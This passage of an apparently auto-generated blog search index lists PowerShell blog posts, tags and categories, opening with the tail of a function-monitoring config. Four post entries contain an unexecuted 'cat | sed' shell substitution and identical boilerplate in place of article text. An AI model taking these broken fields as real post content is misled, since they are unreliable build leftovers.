-MonitorConfig @{ &quot;Execution&quot; = @{ &quot;Metrics&quot; = @(&quot;Duration&quot;, &quot;Executions&quot;, &quot;SuccessRate&quot;) &quot;Threshold&quot; = 80 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } &quot;Memory&quot; = @{ &quot;Metrics&quot; = @(&quot;MemoryUsage&quot;, &quot;MemoryLimit&quot;) &quot;Threshold&quot; = 90 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } &quot;Network&quot; = @{ &quot;Metrics&quot; = @(&quot;Requests&quot;, &quot;Latency&quot;, &quot;Errors&quot;) &quot;Threshold&quot; = 85 &quot;Interval&quot; = 60 &quot;Alert&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\function_monitoring.json&quot; 最佳实践 实施函数管理 配置触发器服务 监控性能指标 保持详细的部署记录 定期进行健康检查 实施监控策略 建立告警机制 保持系统文档更新","link":"/2025/03/17/powershell-serverless-management/"},{"title":"","text":"$(cat _posts/2025-03-21-powershell-education-device-sync.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/21/powershell-education-device-sync/"},{"title":"","text":"$(cat _posts/2025-03-20-powershell-network-operations.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/20/powershell-network-operations/"},{"title":"","text":"$(cat _posts/2025-03-24-powershell-pipeline-filtering.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/24/powershell-pipeline-filtering/"},{"title":"","text":"$(cat _posts/2025-03-25-powershell-image-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/25/powershell-image-processing/"}],"tags":[{"name":"vim","slug":"vim","link":"/tags/vim/"},{"name":"geek","slug":"geek","link":"/tags/geek/"},{"name":"text","slug":"text","link":"/tags/text/"},{"name":"guideline","slug":"guideline","link":"/tags/guideline/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"gtd","slug":"gtd","link":"/tags/gtd/"},{"name":"powershell","slug":"powershell","link":"/tags/powershell/"},{"name":"script","slug":"script","link":"/tags/script/"},{"name":"regex","slug":"regex","link":"/tags/regex/"},{"name":"ebook","slug":"ebook","link":"/tags/ebook/"},{"name":"learning","slug":"learning","link":"/tags/learning/"},{"name":"batch","slug":"batch","link":"/tags/batch/"},{"name":"download","slug":"download","link":"/tags/download/"},{"name":"cheatsheet","slug":"cheatsheet","link":"/tags/cheatsheet/"},{"name":"resource","slug":"resource","link":"/tags/resource/"},{"name":"command","slug":"command","link":"/tags/command/"},{"name":"tip","slug":"tip","link":"/tags/tip/"},{"name":"powertip","slug":"powertip","link":"/tags/powertip/"},{"name":"series","slug":"series","link":"/tags/series/"},{"name":"skill","slug":"skill","link":"/tags/skill/"},{"name":"software","slug":"software","link":"/tags/software/"},{"name":"visualstudio","slug":"visualstudio","link":"/tags/visualstudio/"},{"name":"develop","slug":"develop","link":"/tags/develop/"},{"name":"tool","slug":"tool","link":"/tags/tool/"},{"name":"ide","slug":"ide","link":"/tags/ide/"},{"name":"extension","slug":"extension","link":"/tags/extension/"},{"name":"uac","slug":"uac","link":"/tags/uac/"},{"name":"cmdlet","slug":"cmdlet","link":"/tags/cmdlet/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"microsoft","slug":"microsoft","link":"/tags/microsoft/"},{"name":"iso","slug":"iso","link":"/tags/iso/"},{"name":"release","slug":"release","link":"/tags/release/"},{"name":"cmd","slug":"cmd","link":"/tags/cmd/"},{"name":"registry","slug":"registry","link":"/tags/registry/"},{"name":"delicious","slug":"delicious","link":"/tags/delicious/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"csharp","slug":"csharp","link":"/tags/csharp/"},{"name":"c#","slug":"c","link":"/tags/c/"},{"name":"monthly","slug":"monthly","link":"/tags/monthly/"},{"name":"dos","slug":"dos","link":"/tags/dos/"},{"name":".net","slug":"net","link":"/tags/net/"},{"name":"vmware","slug":"vmware","link":"/tags/vmware/"},{"name":"qq","slug":"qq","link":"/tags/qq/"},{"name":"ad","slug":"ad","link":"/tags/ad/"},{"name":"block","slug":"block","link":"/tags/block/"},{"name":"gvim","slug":"gvim","link":"/tags/gvim/"},{"name":"sp1","slug":"sp1","link":"/tags/sp1/"},{"name":"update","slug":"update","link":"/tags/update/"},{"name":"ddns","slug":"ddns","link":"/tags/ddns/"},{"name":"ip","slug":"ip","link":"/tags/ip/"},{"name":"oray","slug":"oray","link":"/tags/oray/"},{"name":"lesson","slug":"lesson","link":"/tags/lesson/"},{"name":"video","slug":"video","link":"/tags/video/"},{"name":"study","slug":"study","link":"/tags/study/"},{"name":"language","slug":"language","link":"/tags/language/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"scm","slug":"scm","link":"/tags/scm/"},{"name":"mvp","slug":"mvp","link":"/tags/mvp/"},{"name":"0day","slug":"0day","link":"/tags/0day/"},{"name":"appz","slug":"appz","link":"/tags/appz/"},{"name":"repack","slug":"repack","link":"/tags/repack/"},{"name":"node.js","slug":"node-js","link":"/tags/node-js/"},{"name":"window","slug":"window","link":"/tags/window/"},{"name":"module","slug":"module","link":"/tags/module/"},{"name":"bug","slug":"bug","link":"/tags/bug/"},{"name":"angularjs","slug":"angularjs","link":"/tags/angularjs/"},{"name":"link","slug":"link","link":"/tags/link/"},{"name":"mongodb","slug":"mongodb","link":"/tags/mongodb/"},{"name":"nosql","slug":"nosql","link":"/tags/nosql/"},{"name":"database","slug":"database","link":"/tags/database/"},{"name":"mongoose","slug":"mongoose","link":"/tags/mongoose/"},{"name":"markdown","slug":"markdown","link":"/tags/markdown/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"blog","slug":"blog","link":"/tags/blog/"},{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"excel","slug":"excel","link":"/tags/excel/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"server","slug":"server","link":"/tags/server/"},{"name":"xampp","slug":"xampp","link":"/tags/xampp/"},{"name":"apache","slug":"apache","link":"/tags/apache/"},{"name":"proxy","slug":"proxy","link":"/tags/proxy/"},{"name":"ed2k","slug":"ed2k","link":"/tags/ed2k/"},{"name":"cdn","slug":"cdn","link":"/tags/cdn/"},{"name":"asciiart","slug":"asciiart","link":"/tags/asciiart/"},{"name":"animation","slug":"animation","link":"/tags/animation/"},{"name":"style","slug":"style","link":"/tags/style/"},{"name":"guide","slug":"guide","link":"/tags/guide/"},{"name":"bestpractice","slug":"bestpractice","link":"/tags/bestpractice/"},{"name":"career","slug":"career","link":"/tags/career/"},{"name":"productivity","slug":"productivity","link":"/tags/productivity/"},{"name":"C#","slug":"C","link":"/tags/C/"},{"name":"ionic","slug":"ionic","link":"/tags/ionic/"},{"name":"front-end","slug":"front-end","link":"/tags/front-end/"},{"name":"encoding","slug":"encoding","link":"/tags/encoding/"},{"name":"embedded","slug":"embedded","link":"/tags/embedded/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"tip个","slug":"tip个","link":"/tags/tip%E4%B8%AA/"},{"name":"picture","slug":"picture","link":"/tags/picture/"},{"name":"icon","slug":"icon","link":"/tags/icon/"},{"name":"gallery","slug":"gallery","link":"/tags/gallery/"},{"name":"drone","slug":"drone","link":"/tags/drone/"},{"name":"community","slug":"community","link":"/tags/community/"},{"name":"book","slug":"book","link":"/tags/book/"},{"name":"preface","slug":"preface","link":"/tags/preface/"},{"name":"QQ","slug":"QQ","link":"/tags/QQ/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"automation","slug":"automation","link":"/tags/automation/"},{"name":"metaverse","slug":"metaverse","link":"/tags/metaverse/"},{"name":"digital-assets","slug":"digital-assets","link":"/tags/digital-assets/"},{"name":"backup","slug":"backup","link":"/tags/backup/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"azure","slug":"azure","link":"/tags/azure/"},{"name":"serverless","slug":"serverless","link":"/tags/serverless/"},{"name":"supplychain","slug":"supplychain","link":"/tags/supplychain/"},{"name":"vulnerability","slug":"vulnerability","link":"/tags/vulnerability/"},{"name":"compliance","slug":"compliance","link":"/tags/compliance/"},{"name":"zerotrust","slug":"zerotrust","link":"/tags/zerotrust/"},{"name":"healthcheck","slug":"healthcheck","link":"/tags/healthcheck/"},{"name":"loganalysis","slug":"loganalysis","link":"/tags/loganalysis/"},{"name":"green-computing","slug":"green-computing","link":"/tags/green-computing/"},{"name":"ai-optimization","slug":"ai-optimization","link":"/tags/ai-optimization/"},{"name":"datacenter","slug":"datacenter","link":"/tags/datacenter/"},{"name":"kubernetes","slug":"kubernetes","link":"/tags/kubernetes/"},{"name":"ai","slug":"ai","link":"/tags/ai/"},{"name":"microsoft-graph","slug":"microsoft-graph","link":"/tags/microsoft-graph/"},{"name":"azure-ad","slug":"azure-ad","link":"/tags/azure-ad/"},{"name":"openai","slug":"openai","link":"/tags/openai/"},{"name":"natural-language-processing","slug":"natural-language-processing","link":"/tags/natural-language-processing/"},{"name":"devops","slug":"devops","link":"/tags/devops/"},{"name":"terraform","slug":"terraform","link":"/tags/terraform/"},{"name":"dsc","slug":"dsc","link":"/tags/dsc/"},{"name":"hybrid-cloud","slug":"hybrid-cloud","link":"/tags/hybrid-cloud/"},{"name":"variables","slug":"variables","link":"/tags/variables/"},{"name":"scope","slug":"scope","link":"/tags/scope/"},{"name":"functions","slug":"functions","link":"/tags/functions/"},{"name":"computervision","slug":"computervision","link":"/tags/computervision/"},{"name":"zero-trust","slug":"zero-trust","link":"/tags/zero-trust/"},{"name":"device-compliance","slug":"device-compliance","link":"/tags/device-compliance/"},{"name":"virtual-environment","slug":"virtual-environment","link":"/tags/virtual-environment/"},{"name":"resource-orchestration","slug":"resource-orchestration","link":"/tags/resource-orchestration/"},{"name":"red-team","slug":"red-team","link":"/tags/red-team/"},{"name":"privilege-escalation","slug":"privilege-escalation","link":"/tags/privilege-escalation/"},{"name":"lateral-movement","slug":"lateral-movement","link":"/tags/lateral-movement/"},{"name":"azure-functions","slug":"azure-functions","link":"/tags/azure-functions/"},{"name":"code-generation","slug":"code-generation","link":"/tags/code-generation/"},{"name":"xml","slug":"xml","link":"/tags/xml/"},{"name":"nlp","slug":"nlp","link":"/tags/nlp/"},{"name":"multithreading","slug":"multithreading","link":"/tags/multithreading/"},{"name":"runspacepool","slug":"runspacepool","link":"/tags/runspacepool/"},{"name":"att&amp;ck","slug":"att-ck","link":"/tags/att-ck/"},{"name":"threat-hunting","slug":"threat-hunting","link":"/tags/threat-hunting/"},{"name":"process-analysis","slug":"process-analysis","link":"/tags/process-analysis/"},{"name":"cost-optimization","slug":"cost-optimization","link":"/tags/cost-optimization/"},{"name":"multi-cloud","slug":"multi-cloud","link":"/tags/multi-cloud/"},{"name":"security-monitoring","slug":"security-monitoring","link":"/tags/security-monitoring/"},{"name":"device-health","slug":"device-health","link":"/tags/device-health/"},{"name":"edge-computing","slug":"edge-computing","link":"/tags/edge-computing/"},{"name":"mqtt","slug":"mqtt","link":"/tags/mqtt/"},{"name":"device-management","slug":"device-management","link":"/tags/device-management/"},{"name":"optimization","slug":"optimization","link":"/tags/optimization/"},{"name":"iac","slug":"iac","link":"/tags/iac/"},{"name":"text-processing","slug":"text-processing","link":"/tags/text-processing/"},{"name":"device-monitoring","slug":"device-monitoring","link":"/tags/device-monitoring/"},{"name":"industrial-iot","slug":"industrial-iot","link":"/tags/industrial-iot/"},{"name":"devsecops","slug":"devsecops","link":"/tags/devsecops/"},{"name":"supply-chain","slug":"supply-chain","link":"/tags/supply-chain/"},{"name":"ethereum","slug":"ethereum","link":"/tags/ethereum/"},{"name":"smart-contract","slug":"smart-contract","link":"/tags/smart-contract/"},{"name":"web3","slug":"web3","link":"/tags/web3/"},{"name":"container","slug":"container","link":"/tags/container/"},{"name":"ics","slug":"ics","link":"/tags/ics/"},{"name":"energy-optimization","slug":"energy-optimization","link":"/tags/energy-optimization/"},{"name":"predictive-maintenance","slug":"predictive-maintenance","link":"/tags/predictive-maintenance/"},{"name":"cloud","slug":"cloud","link":"/tags/cloud/"},{"name":"azuread","slug":"azuread","link":"/tags/azuread/"},{"name":"error-handling","slug":"error-handling","link":"/tags/error-handling/"},{"name":"debugging","slug":"debugging","link":"/tags/debugging/"},{"name":"multicloud","slug":"multicloud","link":"/tags/multicloud/"},{"name":"machine-learning","slug":"machine-learning","link":"/tags/machine-learning/"},{"name":"log-analysis","slug":"log-analysis","link":"/tags/log-analysis/"}],"categories":[{"name":"vim","slug":"vim","link":"/categories/vim/"},{"name":"powershell","slug":"powershell","link":"/categories/powershell/"},{"name":"tip","slug":"powershell/tip","link":"/categories/powershell/tip/"},{"name":"office","slug":"powershell/office","link":"/categories/powershell/office/"},{"name":"text","slug":"powershell/text","link":"/categories/powershell/text/"},{"name":"geek","slug":"geek","link":"/categories/geek/"},{"name":"visualstudio","slug":"visualstudio","link":"/categories/visualstudio/"},{"name":"text","slug":"text","link":"/categories/text/"},{"name":"git","slug":"git","link":"/categories/git/"},{"name":"mvp","slug":"mvp","link":"/categories/mvp/"},{"name":"software-engineering","slug":"software-engineering","link":"/categories/software-engineering/"},{"name":"angularjs","slug":"angularjs","link":"/categories/angularjs/"},{"name":"mongoose","slug":"mongoose","link":"/categories/mongoose/"},{"name":"markdown","slug":"markdown","link":"/categories/markdown/"},{"name":"network","slug":"network","link":"/categories/network/"},{"name":"nodejs","slug":"nodejs","link":"/categories/nodejs/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"javascript","slug":"javascript","link":"/categories/javascript/"},{"name":"server","slug":"server","link":"/categories/server/"},{"name":"geek","slug":"powershell/geek","link":"/categories/powershell/geek/"},{"name":"career","slug":"career","link":"/categories/career/"},{"name":"C#","slug":"C","link":"/categories/C/"},{"name":"node.js","slug":"node-js","link":"/categories/node-js/"},{"name":"ionic","slug":"ionic","link":"/categories/ionic/"},{"name":"program","slug":"program","link":"/categories/program/"},{"name":"embedded","slug":"embedded","link":"/categories/embedded/"},{"name":"design","slug":"design","link":"/categories/design/"},{"name":"emerging-tech","slug":"powershell/emerging-tech","link":"/categories/powershell/emerging-tech/"},{"name":"cloud","slug":"powershell/cloud","link":"/categories/powershell/cloud/"},{"name":"basic","slug":"powershell/basic","link":"/categories/powershell/basic/"},{"name":"devops","slug":"powershell/devops","link":"/categories/powershell/devops/"},{"name":"security","slug":"powershell/security","link":"/categories/powershell/security/"},{"name":"devops","slug":"powershell/security/devops","link":"/categories/powershell/security/devops/"},{"name":"data","slug":"powershell/data","link":"/categories/powershell/data/"},{"name":"energy","slug":"powershell/energy","link":"/categories/powershell/energy/"},{"name":"office365","slug":"powershell/office365","link":"/categories/powershell/office365/"},{"name":"ai","slug":"powershell/ai","link":"/categories/powershell/ai/"},{"name":"automation","slug":"powershell/ai/automation","link":"/categories/powershell/ai/automation/"},{"name":"scripting","slug":"powershell/scripting","link":"/categories/powershell/scripting/"},{"name":"azure","slug":"powershell/azure","link":"/categories/powershell/azure/"},{"name":"security","slug":"powershell/azure/security","link":"/categories/powershell/azure/security/"},{"name":"data-processing","slug":"powershell/data-processing","link":"/categories/powershell/data-processing/"},{"name":"automation","slug":"powershell/automation","link":"/categories/powershell/automation/"},{"name":"performance","slug":"powershell/performance","link":"/categories/powershell/performance/"},{"name":"ai","slug":"powershell/automation/ai","link":"/categories/powershell/automation/ai/"},{"name":"azure","slug":"powershell/security/azure","link":"/categories/powershell/security/azure/"},{"name":"automation","slug":"powershell/security/automation","link":"/categories/powershell/security/automation/"},{"name":"iot","slug":"powershell/iot","link":"/categories/powershell/iot/"},{"name":"automation","slug":"powershell/iot/automation","link":"/categories/powershell/iot/automation/"},{"name":"system","slug":"powershell/system","link":"/categories/powershell/system/"},{"name":"blockchain","slug":"powershell/blockchain","link":"/categories/powershell/blockchain/"},{"name":"automation","slug":"powershell/blockchain/automation","link":"/categories/powershell/blockchain/automation/"},{"name":"devops","slug":"powershell/azure/devops","link":"/categories/powershell/azure/devops/"},{"name":"kubernetes","slug":"powershell/devops/kubernetes","link":"/categories/powershell/devops/kubernetes/"}],"pages":[{"title":"","text":"","link":"/404"},{"title":"关于","text":"追求卓越，成功自然来victorwoo@gmail.com","link":"/about/"}]}